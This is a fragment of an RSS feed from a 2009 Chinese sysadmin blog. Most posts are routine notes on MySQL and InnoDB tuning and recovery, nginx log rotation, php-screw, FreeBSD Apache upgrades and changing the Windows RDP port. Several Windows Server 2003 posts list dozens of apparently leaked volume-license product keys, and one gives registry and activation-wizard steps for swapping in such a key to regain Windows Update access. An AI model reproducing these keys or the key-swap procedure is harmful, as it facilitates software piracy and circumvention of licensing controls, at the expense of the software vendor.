连接信息及返回客户端前结果集暂存使用内存(net_buffer_size)：这部分用来存放客户端连接线程的连接信息和返回客户端的结果集。当 MySQL 开始产生可以返回的结果集，会在通过网络返回给客户端请求线程之前，会先暂存在通过net_buffer_size所设置的缓冲区中，等满足一定大小的时候才开始向客户端发送，以提高网络传输效率。不过，net_buffer_size参数所设置的仅仅只是该缓存区的初始化大小，MySQL 会根据实际需要自行申请更多的内存以满足需求，但最大不会超过max_allowed_packet 参数大小。
**批量插入暂存使用内存(bulk_insert_buffer_size)：**当我们使用如 insert …values(…),(…),(…)… 的方式进行批量插入的时候，MySQL会先将提交的数据放如一个缓存空间中，当该缓存空间被写满或者提交完所有数据之后，MySQL才会一次性将该缓存空间中的数据写入数据库并清空缓存。此外，当我们进行 LOAD DATA INFILE 操作来将文本文件中的数据 Load进数据库的时候，同样会使用到此缓冲区。
**临时表使用内存(tmp_table_size)：**当我们进行一些特殊操作如需要使用临时表才能完成的Order By，Group By 等等，MySQL 可能需要使用到临时表。当我们的临时表较小（小于 tmp_table_size参数所设置的大小）的时候，MySQL 会将临时表创建成内存临时表，只有当 tmp_table_size所设置的大小无法装下整个临时表的时候，MySQL 才会将该表创建成 MyISAM 存储引擎的表存放在磁盘上。不过，当另一个系统参数max_heap_table_size 的大小还小于 tmp_table_size 的时候，MySQL 将使用max_heap_table_size 参数所设置大小作为最大的内存临时表大小，而忽略 tmp_table_size 所设置的值。而且tmp_table_size 参数从 MySQL 5.</description>
    </item>
    
    <item>
      <title>freebsd下 nginx 日志每天分割</title>
      <link>http://example.org/2009/05/13/freebsde4b88b-nginx-e697a5e5bf97e6af8fe5a4a9e58886e589b2/</link>
      <pubDate>Wed, 13 May 2009 18:42:06 +0000</pubDate>
      
      <guid>http://example.org/2009/05/13/freebsde4b88b-nginx-e697a5e5bf97e6af8fe5a4a9e58886e589b2/</guid>
      <description>#!/bin/sh date today=date +&amp;quot;%Y_%m_%d&amp;quot; logdir=/pub/log daydir=/pub/log/$today expdays=7 if [ ! -d $daydir ] ; then mkdir -p $daydir fi
cp /pub/log/wwwlogs.log $daydir/wwwlogs.log #清空当前日志 /usr/bin/true &amp;gt; /pub/log/wwwlogs.log #删除7天前的过期文件 #find $daydir -type d -mtime +$expdays -maxdepth 1 | xargs rm -rf #每天12点运行 #0 0 * * * /cut_nginx_log.sh </description>
    </item>
    
    <item>
      <title>MSClass (Class Of Marquee Scroll通用不间断滚动JS封装类)</title>
      <link>http://example.org/2009/05/08/msclass-class-of-marquee-scrolle9809ae794a8e4b88de997b4e696ade6bb9ae58aa8jse5b081e8a385e7b1bb/</link>
      <pubDate>Fri, 08 May 2009 06:22:04 +0000</pubDate>
      
      <guid>http://example.org/2009/05/08/msclass-class-of-marquee-scrolle9809ae794a8e4b88de997b4e696ade6bb9ae58aa8jse5b081e8a385e7b1bb/</guid>
      <description>可惜好像官方网站打不开了</description>
    </item>
    
    <item>
      <title>smarty 颜色选择框扩展</title>
      <link>http://example.org/2009/05/07/smarty-e9a29ce889b2e98089e68ba9e6a186e689a9e5b195/</link>
      <pubDate>Thu, 07 May 2009 18:48:50 +0000</pubDate>
      
      <guid>http://example.org/2009/05/07/smarty-e9a29ce889b2e98089e68ba9e6a186e689a9e5b195/</guid>
      <description></description>
    </item>
    
    <item>
      <title>如何加密PHP文件</title>
      <link>http://example.org/2009/05/06/e5a682e4bd95e58aa0e5af86phpe69687e4bbb6e38080/</link>
      <pubDate>Wed, 06 May 2009 10:54:25 +0000</pubDate>
      
      <guid>http://example.org/2009/05/06/e5a682e4bd95e58aa0e5af86phpe69687e4bbb6e38080/</guid>
      <description>由于安全原因，有些时候需要把PHP文件加密。zend是收费的软件，而且价格不菲，让人望尘莫及。这里介绍另一种加密方法：php-screw。 php-screw是一款开源，免费，自由使用的软件，它不仅使用方便，而且可以自定义加密字符串，字符串的长度不受限制。下面这些操作是在Debian环境下实现的。 1、下载软件包。到http://sourceforge.net/projects/php-screw/下载php-screw。下载得到的是tar包。 2、安装必须的软件环境：apt-get install php5-dev php5 3、把在第一步中得到的软件包解压：tar -zxvf php_screw-1.3.tgz 4、进入解压缩后得到的目录：cd php_screw-1.3，然后执行命令：phpize生成一些配置安装文件。 5、检查编译环境： ./configure　#检查编译环境 自定义加密字符串，你据自己的意愿，修改文件my_screw.h内容，这里面主要记录的是加密字符串。 make　#编译 6、把文件modules/php_screw.so拷贝到/usr/lib/php5/2006*/目录下。 7、修改文件/etc/php5/apache2/php.ini，在需要位置添加如下内容： extension=php_screw.so 8、在WEB服务器的根目录里创建文件phpinfo.php，文件的内容如下： 9、在浏览器里输入http:///phpinfo.php，看看php_screw是否生效。 10、进入tools目录，执行命令： make 生成文件screw。 11、进入需要加密的PHP文件所在的文件夹，执行命令 /full/path/of/screw .php 这时的文件便被加密了，原来的文件被重新命名为：.php.screw。 12、screw这个命令只支持单个文件的加密，不支持/full/path/of/screw .php这种命令格式。如果需要把整个目录下的文件加密需要用如下命令： find . -name &amp;lsquo;.php&amp;rsquo; -exec /full/of/path/of/screw {} ; 以上写的这些是在Debian环境下实现的，如果在window平台下，只要加载了php_screw这个模块，加密的文件也可以正常显示，但不能在windows平台下进行加密。 好了，用php_screw加密php文件介绍完了。如果您对这个工具感兴趣，不防试一试。
转自 http://afericazebra.blog.163.com/blog/static/300504082008101902427449/
不错,freebsd 的port 也有,在 /usr/ports/www/php-screw ,正好用一下</description>
    </item>
    
    <item>
      <title>[译]Innodb 性能优化基础</title>
      <link>http://example.org/2009/04/19/e8af91innodb-e680a7e883bde4bc98e58c96e59fbae7a180/</link>
      <pubDate>Sun, 19 Apr 2009 14:50:25 +0000</pubDate>
      
      <guid>http://example.org/2009/04/19/e8af91innodb-e680a7e883bde4bc98e58c96e59fbae7a180/</guid>
      <description>Innodb 性能优化基础
原文链接 http://www.mysqlperformanceblog.com/2007/11/01/innodb-performance-optimization-basics/ 以便于理解,略作删改
问一个基础的问题–如果你有一个16G内存的服务器,专用于mysql大型的Innodb数据库.应该做什么样的设置?
硬件 如果你的Innodb数据库很大,内存是首要的.16-32G现在很便宜了.CPU方面 2个双核的core 就非常好了.但是这跟应用也有很大的关系.第三是IO系统-DAS和RAID是很好的选择.一般来说6-8块硬盘就够了,有时可能需要更多.而且新的2.5″的SAS硬盘,小却速度快.RAID10对于数据存储和主要是读的场合下十分好.需要冗余性的话RAID5也不错但注意对于RAID5的随机写操作.
操作系统 首先 运行64位的操作系统.现在还有很多32位的系统带着很大的内存运行着.建议不要这么做.如果系统是linux,对数据库的目录使用LVM可以获得更高效的备份.ext3文件系统大部分情况下都不会出问题,如果碰到问题的话,试试XFS.如果你使用innodb_file_per_table而且表很多的话可以使用noatime和nodiratime选项,但是这样做效果不是很大.Also make sure you wrestle OS so it would not swap out MySQL out of memory. (最后这句话不知道该如何翻译)
MYSQL 的Innodb 设置 最重要的地方有:
innodb_buffer_pool_size 设为内存的70%-80%都是安全的.我在一个16G的机器上把它设成12G. UPDATE 关于它具体的查看http://www.mysqlperformanceblog.com/2007/11/03/choosing-innodb_buffer_pool_size/ innodb_log_file_size 这取决于你需要的回复速度.256M这个数值是适当的恢复时间和良好性能之间的一个好的平衡. innodb_log_buffer_size=4M 大多数情况4M足够,除非正将很大的blob数据导入到Innodb中可以增加一点. innodb_flush_log_at_trx_commit=2 如果你不是很关心ACID,可以容许在系统完全crash的情况下丢失最后一两秒的事务,那么可以设置这个值.它可以极大的提高“短“的写事务的效率. innodb_thread_concurrency=8 这个值取决于你的程序,可能高或者低.8是代表起始值. innodb_flush_method=O_DIRECT 避免双缓冲(double buffering)和降低swap的压力.大多数情况下可以提高性能.但是注意如果你RAID cache不够的话,写IO的操作会有麻烦. innodb_file_per_table 如果你的表不多可以使用这个选项.这样你就不会有不受控的innodb主表空间的增长,这个主表空间是不能重新定义的.这个选项在4.1版中引入,现在可以放心使用. 查看你的程序是否可以运行在READ-COMMITED 隔离模式下,如果可以,就可以设为默认的transaction-isolation=READ-COMMITTED.这个选项有一些性能的优势,特别是在5.0,5.1版和行级别的复制方面.
其他的可以参考 http://www.mysqlperformanceblog.com/2006/09/29/what-to-tune-in-mysql-server-after-installation/ http://www.mysqlperformanceblog.com/mysql-performance-presentations/
应用程序的优化 如果原来是MyISAM,现在你可能需要对应用做一些修改.首先确保你在进行数据库更新的时候使用事务,这对数据一致性和性能都有好处. 其次如果你的应用有写操作的话要注意处理死锁问题. 第三你要重新检视你的表结构,尽可能利用Innodb的优势–主键的群集(clustering by primary key),在所有的索引里面有主键,让主键简单.使用主键来快速查询(在连接中使用),large unpacked indexes (try to be easy on indexes).</description>
    </item>
    
    <item>
      <title>［翻译］［注解］Innodb Performance Optimization Basics</title>
      <link>http://example.org/2009/04/19/innodb-performance-optimization-basics/</link>
      <pubDate>Sun, 19 Apr 2009 14:47:07 +0000</pubDate>
      
      <guid>http://example.org/2009/04/19/innodb-performance-optimization-basics/</guid>
      <description>原文链接地址如下：http://www.mysqlperformanceblog.com/2007/11/01/innodb-performance-optimization-basics/ 这篇文章写于2007年11月 翻译参考了这篇译稿：http://yahoon.blog.51cto.com/13184/76592 推荐详细阅读原作者的这篇演讲稿 Innodb性能优化基础 面试别人的时候我喜欢问一个基础的问题：如果你有一个16G内存，专用于mysql大型innodb的数据库服务器， 对于典型的web负载，你应该怎样调整mysql的设置？有趣的是其中大多数并不能提出任何有益的建议。 所以我决定公布答案，并且我很乐意在硬件，操作系统和应用方面谈谈基础的一些优化。 这篇文章的标题是‘Inodb性能优化基础’，所以这里面的是一些普遍的准则，适用于很多的应用场景， 当然最佳的设置要依据具体的应用而定。
硬件 如果你的Innodb数据库很大,那么内存是最重要的。现在16-32G的内存性价比就不错。 From CPU standpoint 2*Dual Core CPUs seems to do very well, while with even just two Quad Core CPUs scalability issues can be observed on many workloads. CPU方面，两个双核的CPU，似乎就不错了，而即使只有两个四核心CPU的可扩展性问题都可以观察到很多的工作量，但是这跟应用也有很大的关系。（这里翻译的很别扭，大家看原文） 第三是IO系统－－DAS和RAID是很好的选择.一般来说6-8块硬盘就够了,有时可能需要更多。同时注意新的2.5″的SAS硬盘,小却速度快。RAID10对于数据存储和主要是读的场合下十分合适。需要冗余性的话RAID5也不错，但注意对于RAID5的随机写操作。
操作系统
首先－－运行64位的操作系统。现在不少有大内存的服务器，上面还跑着32位的操作系统。建议不要这么做。 如果系统是linux，对数据库的目录使用LVM可以获得更高效的备份。 ext3文件系统大部分情况下都不会出问题，如果碰到问题的话，试试XFS。 如果你使用innodb_file_per_table而且表很多的话可以使用noatime和nodiratime选项，但是这样做效果不是很大。 同时注意给系统留出足够的内存，防止mysql和系统发生内存竞争导致被交换出内存。
MYSQL 的Innodb 设置
（关于更多更详细的参数说明，请参考这里（中文文档）） 最重要的地方有:
innodb_buffer_pool_size 设为内存的70%-80%都是安全的。我在一个16G的服务器上把它设成12G。 UPDATE： 如果你想了解更多的细节，请查看tuning innodb buffer pool innodb_log_file_size 这取决于你需要的出错恢复速度。256M是合理的恢复时间和良好性能之间不错的一个平衡值。 innodb_log_buffer_size=4M 大多数情况4M就够了。如果你有大量的事务处理，这个数值可以增加一点儿。 innodb_flush_log_at_trx_commit=2 如果你不是很关心ACID，可以容许在系统完全崩溃的情况下丢失最后一两秒的事务，那么可以设置这个值为2。它可以极大的提高短的写事务的效率。 innodb_thread_concurrency=8 即使目前的InnoDB可扩展性修复后，对并发的支持也是有限的。这个值取决于你的程序，可能高或者低一些。8是可以接受的默认值。 innodb_flush_method=O_DIRECT 避免双缓冲(double buffering)和降低swap的压力，大多数情况下可以提高性能。但是注意如果你RAID cache不够的话，写IO的操作会有麻烦。 innodb_file_per_table 如果你的表不多可以使用这个选项。这样你就不会有不受控的innodb主表空间的增长，这个主表空间是不能重新定义的。这个选项在4.</description>
    </item>
    
    <item>
      <title>什么时候该增加MySQL数据库的内存？</title>
      <link>http://example.org/2009/04/18/mysql-when-add-memory/</link>
      <pubDate>Sat, 18 Apr 2009 22:46:45 +0000</pubDate>
      
      <guid>http://example.org/2009/04/18/mysql-when-add-memory/</guid>
      <description>除了优化好数据库配置文件外，更换/增加MySQL数据库服务器的硬件，是提高数据库性能最直接有效的方法。
这里先从最便宜的内存入手。（服务器内存和硬盘价格一般是台式机的5倍左右）
最便捷的方法是使用 mysqlreport，来持续关注报告里面‘Key’和‘InnoDB Buffer Pool’这两个部分。如果你的my.cnf参数设置正确，但是Read hit一直低于99%，那么就要考虑增加内存了。
那么Read hit是怎么计算出来的呢？为什么要持续关注？在MySQL的命令行下：
mysql&amp;gt; show status like &#39;key_read%&#39;; +-------------------+------------+ | Variable_name | Value | +-------------------+------------+ | Key_read_requests | 3041374401 | | Key_reads | 60959876 | +-------------------+------------+ 2 rows in set (0.02 sec) key_efficiency(Read hit) = 1 - (Key_reads / Key_read_requests) = 97.995647100207184% mysql&amp;gt; show status like &#39;Innodb_buffer_pool_read%&#39;; +-----------------------------------+------------+ | Variable_name | Value | +-----------------------------------+------------+ | Innodb_buffer_pool_read_ahead_rnd | 1660545 | | Innodb_buffer_pool_read_ahead_seq | 576767 | | Innodb_buffer_pool_read_requests | 2080081461 | | Innodb_buffer_pool_reads | 292415839 | +-----------------------------------+------------+ 4 rows in set (0.</description>
    </item>
    
    <item>
      <title>mysql中InnoDB的强制恢复</title>
      <link>http://example.org/2009/04/17/mysql-innodb-force-recover/</link>
      <pubDate>Fri, 17 Apr 2009 17:58:26 +0000</pubDate>
      
      <guid>http://example.org/2009/04/17/mysql-innodb-force-recover/</guid>
      <description>如果数据库页被破坏，你可能想要用SELECT INTO OUTFILE从从数据库转储你的表，通常以这种方法获取的大多数数据是完好的。即使这样，损坏可能导致SELECT * FROM tbl_name或者InnoDB后台操作崩溃或断言，或者甚至使得InnoDB前滚恢复崩溃。 尽管如此，你可以用它来强制InnoDB存储引擎启动同时阻止后台操作运行，以便你能转储你的表。例如：你可以在重启服务器之前，在选项文件的[mysqld]节添加如下的行：
[mysqld] innodb_force_recovery = 4 innodb_force_recovery 被允许的非零值如下。一个更大的数字包含所有更小数字的预防措施。如果你能够用一个多数是4的选项值来转储你的表，那么你是比较安全的，只有一些在损坏的单独页面上的数据会丢失。一个为6的值更夸张，因为数据库页被留在一个陈旧的状态，这个状态反过来可以引发对B树和其它数据库结构的更多破坏。
· 1 (SRV_FORCE_IGNORE_CORRUPT)
即使服务器检测到一个损坏的页，也让服务器运行着；试着让SELECT * FROM tbl_name 跳过损坏的索引记录和页，这样有助于转储表。
· 2 (SRV_FORCE_NO_BACKGROUND)
阻止主线程运行，如果崩溃可能在净化操作过程中发生，这将阻止它。
· 3 (SRV_FORCE_NO_TRX_UNDO)
恢复后不运行事务回滚。
· 4 (SRV_FORCE_NO_IBUF_MERGE)
也阻止插入缓冲合并操作。如果你可能会导致一个崩溃。最好不要做这些操作，不要计算表统计表。
· 5 (SRV_FORCE_NO_UNDO_LOG_SCAN)
启动数据库之时不查看未完成日志：InnoDB把未完成的事务视为已提交的。
· 6 (SRV_FORCE_NO_LOG_REDO)
不要在恢复连接中做日志前滚。
数据库不能另外地带着这些选项中被允许的选项来使用。作为一个安全措施，当innodb_force_recovery被设置为大于0的值时，InnoDB阻止用户执行INSERT, UPDATE或DELETE操作.
即使强制恢复被使用，你也可以DROP或CREATE表。如果你知道一个给定的表正在导致回滚崩溃，你可以移除它。你也可以用这个来停止由失败的大宗导入或失败的ALTER TABLE导致的失控回滚。你可以杀掉mysqld进程，然后设置innodb_force_recovery为3，使得数据库被挂起而不需要回滚，然后舍弃导致失控回滚的表。
本文地址：http://www.bhcode.net/article/20090227/4256.html</description>
    </item>
    
    <item>
      <title>只有一个ibd文件如何恢复数据表</title>
      <link>http://example.org/2009/04/17/recover-mysql-databases-table-width-idb/</link>
      <pubDate>Fri, 17 Apr 2009 17:50:28 +0000</pubDate>
      
      <guid>http://example.org/2009/04/17/recover-mysql-databases-table-width-idb/</guid>
      <description>如果目前只有一个ibd的文件，那么我们该怎么恢复整个数据库？原文的作者给出了两种恢复的方法。这两种方法的前提有两个：
1、一是知道所有需要恢复表的创建语句
2、需要一个16进制的编辑器，修改表id
具体的内容请看原文：
Sometime you may need to recover a table when all you have is the .ibd file. In this case, if you try to load it into a new instance, your likely to encounter some errors about the table id not matching. And there is not really a way around this.
However, I’ve found two work-arounds for this:
Note: You will need the .ibd file and the CREATE TABLE statement for each table you want to recover using these methods.</description>
    </item>
    
    <item>
      <title>更新與安裝 - Install Apache 2.2.11 or Upgrade on FreeBSD</title>
      <link>http://example.org/2009/04/17/install-apache-or-upgrade-on-freebsd/</link>
      <pubDate>Fri, 17 Apr 2009 08:02:04 +0000</pubDate>
      
      <guid>http://example.org/2009/04/17/install-apache-or-upgrade-on-freebsd/</guid>
      <description>Apache 2.2.11 主要是更新了個錯誤 步驟如下
1.更新 FreeBSD 的 src 與 ports 到目前最新版
cd /usr/src make update 就個人經驗而言,最好是將相關的 apache-, php5- , pear-* , pecl-* , Smarty , eaccelerator , webmail 等都備份後移除 然後再一步一步安裝更新上去 這樣雖然很麻煩,卻最能避免產生問題後無法處理的情況 PS : 都安裝好了,沒有錯誤訊息, Apache 卻開不起來
2.先備份設定後,然後將相關套件及設定全數移除
pkg_info |sort &amp;gt; /root/pkg.info.txt tar -zcvf /root/etc.tar.gz /etc tar -zcvf /root/usr.local.etc.tar.gz /usr/local/etc tar -zcvf /root/etc.namedb.tar.gz /var/named/etc/namedb tar -zcvf /root/ports_options.tar.gz /var/db/ports pkg_delete -f /var/db/pkg/apache* pkg_delete -f /var/db/pkg/pecl* pkg_delete -f /var/db/pkg/eaccelerator* pkg_delete -f /var/db/pkg/smarty* pkg_delete -f /var/db/pkg/joomla* pkg_delete -f /var/db/pkg/eGroupware* pkg_delete -f /var/db/pkg/pear* pkg_delete -f /var/db/pkg/php5* 3.</description>
    </item>
    
    <item>
      <title>freebsd7.x安装vmware-tools</title>
      <link>http://example.org/2009/04/13/freebsd7x-install-vmware-tools/</link>
      <pubDate>Mon, 13 Apr 2009 16:11:37 +0000</pubDate>
      
      <guid>http://example.org/2009/04/13/freebsd7x-install-vmware-tools/</guid>
      <description>刚开始搞freebsd，先在vmware里试试。 先要安装compat6x 在/usr/ports/misc/compat6x 然后执行
ln -s /usr/local/lib/compat/libc.so.6 /lib 原文 http://bbs3.chinaunix.net/thread-1364897-1-5.html</description>
    </item>
    
    <item>
      <title>Windows Server 2003 Enterprise x64 Edition  更新到sp2的郁闷</title>
      <link>http://example.org/2009/04/13/windows-server-2003-enterprise-x64-edition-e69bb4e696b0e588b0sp2e79a84e98381e997b7/</link>
      <pubDate>Mon, 13 Apr 2009 02:29:10 +0000</pubDate>
      
      <guid>http://example.org/2009/04/13/windows-server-2003-enterprise-x64-edition-e69bb4e696b0e588b0sp2e79a84e98381e997b7/</guid>
      <description>更新完没有重起,过一阵子远程弹出 An error occurred while the wizard was checking the current Windows product license. Error Code: 0x8007007f
比较郁闷,没办法只能机房重起,解决了</description>
    </item>
    
    <item>
      <title>查看免激活版序列号</title>
      <link>http://example.org/2009/04/12/e69fa5e79c8be5858de6bf80e6b4bbe78988e5ba8fe58897e58fb7/</link>
      <pubDate>Sun, 12 Apr 2009 19:44:35 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/e69fa5e79c8be5858de6bf80e6b4bbe78988e5ba8fe58897e58fb7/</guid>
      <description>打开光盘到i386文件夹里找winnt.sif文件</description>
    </item>
    
    <item>
      <title>windows2003不能上网更新及注册码更换问题解决</title>
      <link>http://example.org/2009/04/12/windows2003e4b88de883bde4b88ae7bd91e69bb4e696b0e58f8ae6b3a8e5868ce7a081e69bb4e68da2e997aee9a298e8a7a3e586b3/</link>
      <pubDate>Sun, 12 Apr 2009 19:30:53 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/windows2003e4b88de883bde4b88ae7bd91e69bb4e696b0e58f8ae6b3a8e5868ce7a081e69bb4e68da2e997aee9a298e8a7a3e586b3/</guid>
      <description>先打开注册表，在 HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\WPAEvents
随便修改一个字，并保存退出regedit。 然后到c:\windows\system32\oobe下
运行msoobe /a 打开激活程序。
选择电话，
更换密钥为
JCGMJ-TC669-KCBG7-HB8X2-FXG7M 或 JK6JC-P7P7H-4HRFC-3XM7P-G33HM
然后关掉窗口不要管那个什么四个步骤
update即可 然后重启。 点击“Windows Update”，连接到更新网站，试一下是否可以在线升级和更新了。
以上方法就可以更换cd key了。。注册码写错了的可以改。。。</description>
    </item>
    
    <item>
      <title>windows远程登陆端口的修改方法</title>
      <link>http://example.org/2009/04/12/windowse8bf9ce7a88be799bbe99986e7abafe58fa3e79a84e4bfaee694b9e696b9e6b395/</link>
      <pubDate>Sun, 12 Apr 2009 19:26:03 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/windowse8bf9ce7a88be799bbe99986e7abafe58fa3e79a84e4bfaee694b9e696b9e6b395/</guid>
      <description>Windows终端服务原始端口是3389 一、服务器端： 1、第一处 运行RegEdit，打开注册表编辑器。找到[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]，看到右边的 PortNumber 了吗？在十进制状态下改成你想要的端口号吧，比如 7126 之类的，只要不与其它冲突即可。 2、第二处 运行RegEdit，打开注册表编辑器。找到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp，方法同上，记得改的端口号和上面改的一样就行了。 二、客户端： 最简洁的方法就是拷贝WindowsXP的终端服务客户端程序，不用安装，只有1M多，登录只需在地址栏输入IP+:+端口号。 另，Windows2000 也可作如下修改： 打开客户端管理连接器，单击已经建好的某个连接，单击“文件(File)”→“导出(Export)”…… 用记录本或其它文本编辑软件找开刚导出的这个.cns文件，找到“Server Port=3389”这一行了吗？ 把这个默认的 3389 改成与服务器一样的端口号就行了。 Windows XP/2003 下的修改办法 使用WindowsXP或Windows2003的客户端，它可以显示多彩，还可以有声音，功能更强大。但终端客户端连接端口的修改方法与Windows2000有一定区别： 按照原来更改Windows2000的客户端的思路，把WindowsXP、Windows2003的默认配置另存(在连接界面上单击“另存为”)，和Windows2000不一样的是：WindowsXP、Windows2003的配置文件后缀是.rdp，Windows2000的是.cns 用记事本打开这个default.rdp文件，在里面没有发现什么3389的东东(Windows2000的配置文件是有的)，没有这句端口的配置我们就给它加上，假定现在的端口为8933，如下： server port:i:8933 保存，退出即可。</description>
    </item>
    
    <item>
      <title>Windows Server 2003企业版 Enterprise Edition VOL(VLK) 简体中文企业正式版原版光盘镜像</title>
      <link>http://example.org/2009/04/12/windows-server-2003e4bc81e4b89ae78988-enterprise-edition-volvlk-e7ae80e4bd93e4b8ade69687e4bc81e4b89ae6ada3e5bc8fe78988e58e9fe78988e58589e79b98/</link>
      <pubDate>Sun, 12 Apr 2009 19:22:58 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/windows-server-2003e4bc81e4b89ae78988-enterprise-edition-volvlk-e7ae80e4bd93e4b8ade69687e4bc81e4b89ae6ada3e5bc8fe78988e58e9fe78988e58589e79b98/</guid>
      <description>企业版（64bit）Version: Microsoft Windows Server 2003, Enterprise Edition (64-bit)Filename: x09-45916.iso
Product Key: CTQTP-3XXXX-YT7JT-DVMH7-46Q2J</description>
    </item>
    
    <item>
      <title>[MSDN]Windows Server 2003 R2, Enterprise Edition with SP2 - VL (简体中文)</title>
      <link>http://example.org/2009/04/12/msdnwindows-server-2003-r2-enterprise-edition-with-sp2-vl-e7ae80e4bd93e4b8ade69687/</link>
      <pubDate>Sun, 12 Apr 2009 18:07:23 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/msdnwindows-server-2003-r2-enterprise-edition-with-sp2-vl-e7ae80e4bd93e4b8ade69687/</guid>
      <description>Windows Server 2003 SP2是针对Windows Server 2003和Windows XP 64位专业版而设计，它集成了最新的升级、安全与稳定性增强包和最新功能。据微软透露，SP2的采用率从发布以来直线上升，它表示自推出不到一周，总下载次数就已经超过400，000次。 参考KEY: VB96B-VFG8F-74XWJ-W67Q7-8X82B M6F6D-VFQWH-CGWRB-RC7JR-VCV4W C49DP-CPHCB-MDGP3-MG334-W2V4W DR4B3-66VPQ-CK3VB-Y3BPY-2CJ2G J YCJX-CHTJX-RGH97-86WM9-RB6B6 MVDYF-X7FBW-H29XT-TCKWW-RBYRT BXJXT-9F88V-XXQWV-3MWMG-FYDJT MHFT3-YGHV4-G86P4-KQXJ3-GYH4W MDGJK-PF6YQ-PD8DJ-RFQVM-7WKWG QV9XT-CV22K-D8MGR-4MD86-8MYR6
MDGJK-PF6YQ-PD8DJ-RFQVM-7WKWG
btr9t-8bjjm-k9dh8-w8grh-7qbqy btvtj-8jdph-6r8xk-6xhyq-6qrdy btr9x-4x8ty-2y3w2-jyw3c-tbpmb btt8k-djkyj-x2m9c-kd6rj-db6bb bt3by-cmdtc-twyx3-kfqqq-g3kvm btyqc-347pg-9kb4h-dphh4-rdwyb btv3w-xyb3j-rj9mf-qbkdw-4qbqy btrfk-m749t-f6my2-8mc6w-g2fdy btv4w-jqx3w-y6wkp-dxjc7-7qbqy btrrd-kpkh6-v9jfq-c7dv9-9kg7m btqhd-kmr67-36m66-8kcrr-fxtbb btq8x-6mj6m-vrjvq-c7x82-v2fdy btw6c-6tjmw-3rmw7-3d2vd-pfcmb bt2h3-kwt84-cxvxm-wdgqx-7tpmb btqdm-vpch2-vfcpk-4696j-yv2mb btxy7-tth4f-7jjmm-q4gmg-x7fdy bttdh-rt9bp-6c38g-v6bp9-pxmqy
安装序列号 CD-KEY：JB88F-WT2Q3-DPXTT-Y8GHG-7YYQY 安装序列号：JCGMJ-TC669-KCBG7-HB8X2-FXG7M 使用这个序列号 Windows Server 2003 可在线升级! 如果已经安装了 Windows Server 2003 Enterprise Edition 3790 操作系统，安装时使用了
JB88F-WT2Q3-DPXTT-Y8GHG-7YYQY 这个安装序列号或其他的号，正常激活系统但不能在线升级的，
你可以不需要卸载掉原来的操作系统重新使用 JCGMJ-TC669-KCBG7-HB8X2-FXG7M 进行安装了，
就立即可以实现在线升级了！</description>
    </item>
    
    <item>
      <title>Windows Server 2003 R2 with SP2 x32/x64 MSDN简体官方企业/标准版[附真正激活KEY]</title>
      <link>http://example.org/2009/04/12/windows-server-2003-r2-with-sp2-x32x64-msdne7ae80e4bd93e5ae98e696b9e4bc81e4b89ae6a087e58786e78988e99984e79c9fe6ada3e6bf80e6b4bbkey/</link>
      <pubDate>Sun, 12 Apr 2009 17:26:07 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/windows-server-2003-r2-with-sp2-x32x64-msdne7ae80e4bd93e5ae98e696b9e4bc81e4b89ae6a087e58786e78988e99984e79c9fe6ada3e6bf80e6b4bbkey/</guid>
      <description>附上KEY，通用于windows2003 标准版，企业版，SP1，SP2，R2(此KEY网上基本未公开)
附32位KEY T274Y-RT6TY-QYXJC-H6K66-3MT7M H32XR-3KT6X-B83DT-YWM3T-8Q3JG DF33F-WMT84-KDPKT-FQBRG-7YH4T BYR7R-QTCG2-JRJWJ-BJPGP-XDKWG RW89D-BPHQ9-Y77PD-FPYHP-JJ3JG G9DRJ-PBH7J-KQFCF-9PCJG-3VV4T GXJ7R-PDJKW-7TMRK-VT6JC-G4XWG 附64位KEY MM72Q-QBVRW-JGDB6-94C22-GR8YJ HFKHT-CF86J-KFM6F-34RXX-HYYQ8 RYCR6-T7Y6M-2TVHK-C2YW3-7TYQ8 BTXT2-YJ7CH-6MH2Q-X2WD7-77FDY</description>
    </item>
    
    <item>
      <title>win2003英文版系统显示中文的方法</title>
      <link>http://example.org/2009/04/12/win2003e88bb1e69687e78988e7b3bbe7bb9fe698bee7a4bae4b8ade69687e79a84e696b9e6b395/</link>
      <pubDate>Sun, 12 Apr 2009 17:17:39 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/win2003e88bb1e69687e78988e7b3bbe7bb9fe698bee7a4bae4b8ade69687e79a84e696b9e6b395/</guid>
      <description>Control Panel -&amp;gt; Regional and Language Options -&amp;gt; Advanced non-unicode 下拉菜单选择Chinese(PRC) 就行了。装系统时，没装亚太语言支持的，自动就会提示你放入系统安装盘安装。</description>
    </item>
    
    <item>
      <title>补32bitWindows 2003 R2 With Sp2序列号</title>
      <link>http://example.org/2009/04/12/e8a1a532bitwindows-2003-r2-with-sp2e5ba8fe58897e58fb7/</link>
      <pubDate>Sun, 12 Apr 2009 17:00:39 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/e8a1a532bitwindows-2003-r2-with-sp2e5ba8fe58897e58fb7/</guid>
